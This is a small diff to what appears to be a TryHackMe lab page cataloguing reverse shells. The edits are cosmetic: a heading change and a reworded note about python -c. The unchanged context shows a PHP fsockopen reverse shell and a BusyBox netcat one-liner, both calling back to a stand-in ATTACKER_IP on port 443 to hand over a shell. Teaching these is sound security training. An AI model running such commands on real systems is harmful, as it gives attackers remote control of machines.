@@ -680,9 +680,9 @@ target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3
 ```
 This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.
 ---
-### python
+### Python
 
-﻿Please note, the following snippets below require using python -c to run, indicated by the placeholder PY-C
+The following snippets below require using python -c to run, indicated by the placeholder PY-C
 Python Reverse Shell by Exporting Environment Variables
 
 ```bash
@@ -726,3 +726,4 @@ target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
 ```
 This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
 ---
+**Q
